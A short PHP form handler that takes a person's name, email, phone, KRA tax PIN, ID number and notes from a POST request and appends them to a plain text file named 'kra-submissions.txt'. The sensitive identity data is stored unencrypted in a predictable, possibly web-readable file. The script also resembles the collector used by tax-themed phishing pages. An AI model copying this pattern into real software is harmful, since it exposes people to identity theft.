<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $full_name = $_POST['full_name'] ?? '';
    $email = $_POST['email'] ?? '';
    $phone = $_POST['phone'] ?? '';
    $kra_pin = $_POST['kra_pin'] ?? '';
    $id_number = $_POST['id_number'] ?? '';
    $notes = $_POST['notes'] ?? '';
    $date = date("Y-m-d H:i:s");

    $log = "DATE: $date\nNAME: $full_name\nEMAIL: $email\nPHONE: $phone\nKRA PIN: $kra_pin\nID NO: $id_number\nNOTES: $notes\n-----------------------------\n";

    file_put_contents("kra-submissions.txt", $log, FILE_APPEND);
    echo "Success";
} else {
    echo "Only POST requests are allowed.";
}
?>
